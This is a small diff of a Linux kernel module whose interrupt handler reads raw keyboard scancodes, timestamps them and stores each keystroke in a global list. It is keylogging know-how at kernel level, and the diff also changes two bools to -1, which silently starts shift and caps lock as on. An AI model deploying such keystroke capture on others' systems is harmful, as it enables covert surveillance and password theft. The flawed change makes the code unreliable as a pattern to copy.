@@ -3,12 +3,12 @@
 extern struct s_keyboard_map keyboard_mapping[];
 extern struct list_head head_stroke_lst;
 
-bool shift = 0;
-bool caps_lock = 0;
+bool shift = -1;
+bool caps_lock = -1;
 DEFINE_SPINLOCK(scan_lock);
 
 static void fill_stroke(struct s_stroke *new, struct s_keyboard_map *entry,
-		        struct timespec ts, unsigned char scancode)
+			struct timespec ts, unsigned char scancode)
 
 {
 	new->key =  scancode & 0x7f;
@@ -28,7 +28,6 @@ static void fill_stroke(struct s_stroke *new, struct s_keyboard_map *entry,
 		new->value = shift ? entry->shift_ascii : entry->ascii;
 	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
 	list_add(&new->stroke_lst, &head_stroke_lst);
-
 }
 
 irqreturn_t keyboard_handler (int irq, void *dev_id)
@@ -40,12 +39,11 @@ irqreturn_t keyboard_handler (int irq, void *dev_id)
 
 	getnstimeofday(&ts);
 	spin_lock(&scan_lock);
-	scancode = inb (0x60);
+	scancode = inb(0x60);
 	spin_unlock(&scan_lock);
-	new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC);
+	new = kmalloc(sizeof(*new), GFP_ATOMIC);
 	if (new)
 		fill_stroke(new, entry, ts, scancode);
 	return IRQ_HANDLED;
 }
-
 EXPORT_SYMBOL(keyboard_handler);
